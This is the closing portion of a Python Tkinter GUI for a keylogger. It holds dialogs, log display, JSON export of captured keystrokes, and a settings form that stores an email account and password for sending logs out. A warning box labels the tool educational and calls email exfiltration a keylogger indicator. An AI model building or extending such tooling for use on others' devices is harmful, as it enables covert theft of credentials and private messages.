               relief=FLAT, cursor='hand2').pack(side=LEFT, padx=10)
        
        Button(btn_frame, text="Cancel",
               command=on_no,
               bg='#6c757d', fg='white',
               font=("Arial", 10, "bold"),
               padx=25, pady=8,
               relief=FLAT, cursor='hand2').pack(side=LEFT, padx=10)
        
        # Wait for result
        self.root.wait_window(confirm_window)
        
        if result['confirmed']:
            self.log_text.config(state=NORMAL)
            self.log_text.delete(1.0, END)
            self.log_text.config(state=DISABLED)
            self.update_status("Log display cleared")
    
    def append_to_log(self, text):
        """Append text to log display"""
        self.log_text.config(state=NORMAL)
        self.log_text.insert(END, text)
        self.log_text.see(END)
        self.log_text.config(state=DISABLED)
        self.root.update()
    
    def save_email_settings(self):
        """Save email configuration"""
        Config.EMAIL_ENABLED = self.email_enabled.get()
        Config.SENDER_EMAIL = self.sender_email.get()
        Config.SENDER_PASSWORD = self.sender_password.get()
        Config.RECEIVER_EMAIL = self.receiver_email.get()
        
        # Create custom success dialog
        success_window = Toplevel(self.root)
        success_window.title("✅ Settings Saved")
        success_window.geometry("500x300")
        success_window.resizable(False, False)
        success_window.configure(bg='white')
        success_window.grab_set()
        
        # Center
        success_window.update_idletasks()
        x = (success_window.winfo_screenwidth() // 2) - (250)
        y = (success_window.winfo_screenheight() // 2) - (150)
        success_window.geometry(f'500x300+{x}+{y}')
        
        # Title
        title_frame = Frame(success_window, bg='#28a745', height=70)
        title_frame.pack(fill=X)
        title_frame.pack_propagate(False)
        
        Label(title_frame, text="✅", font=("Arial", 28),
              bg='#28a745', fg='white').pack(pady=5)
        Label(title_frame, text="Email Settings Saved",
              font=("Arial", 12, "bold"), bg='#28a745', fg='white').pack()
        
        # Content
        content_frame = Frame(success_window, bg='white')
        content_frame.pack(fill=BOTH, expand=True, padx=30, pady=20)
        
        Label(content_frame,
              text="Your email configuration has been saved.",
              font=("Arial", 11),
              bg='white').pack(pady=10)
        
        # Warning box
        warning_frame = Frame(content_frame, bg='#fff3cd', relief=SOLID, borderwidth=1)
        warning_frame.pack(pady=15, fill=X, padx=10)
        
        Label(warning_frame,
              text="⚠️ Important Security Note",
              font=("Arial", 10, "bold"),
              bg='#fff3cd', fg='#856404').pack(pady=5)
        
        Label(warning_frame,
              text="Email exfiltration is a KEY INDICATOR\n"
                   "of keylogger activity!",
              font=("Arial", 9),
              bg='#fff3cd', fg='#856404').pack(pady=3)
        
        Label(warning_frame,
              text="Use ONLY for educational purposes\n"
                   "on your own device.",
              font=("Arial", 9),
              bg='#fff3cd', fg='#856404').pack(pady=(0, 10))
        
        # Button
        Button(success_window, text="OK",
               command=success_window.destroy,
               bg='#007bff', fg='white',
               font=("Arial", 11, "bold"),
               padx=40, pady=10,
               relief=FLAT, cursor='hand2').pack(pady=10)
        
        self.update_status("Email settings saved")
    
    def open_log_folder(self):
        """Open the folder containing log files"""
        try:
            folder = os.path.dirname(os.path.abspath(Config.LOG_FILE))
            os.startfile(folder)
        except:
            messagebox.showinfo(
                "Log Folder",
                f"Log files are located at:\n{os.path.abspath('.')}"
            )
    
    def update_status(self, message):
        """Update status bar"""
        self.status_label.config(text=message)
        self.root.update()
    
    def toggle_dark_mode(self):
        """Toggle between light and dark mode."""
        if self.root['bg'] == 'white':
            self.root.configure(bg='#2c3e50')
            self.status_label.configure(bg='#34495e', fg='white')
        else:
            self.root.configure(bg='white')
            self.status_label.configure(bg='#ecf0f1', fg='black')
    
    def export_logs_as_json(self):
        """Export logs to a JSON file."""
        try:
            with open('keylog.json', 'w') as json_file:
                json.dump(self.keylogger.get_log(), json_file, indent=4)
            messagebox.showinfo("Export Successful", "Logs have been exported to keylog.json")
        except Exception as e:
            messagebox.showerror("Export Failed", f"An error occurred: {e}")


# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main function"""
    try:
        root = Tk()
        if not root:
            raise RuntimeError("Failed to initialize Tkinter main window.")

        app = KeyloggerGUI(root)

        # Center window
        root.update_idletasks()
        width = root.winfo_width()
        height = root.winfo_height()
        x = (root.winfo_screenwidth() // 2) - (width // 2)
        y = (root.winfo_screenheight() // 2) - (height // 2)
        root.geometry(f'{width}x{height}+{x}+{y}')

        root.mainloop()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()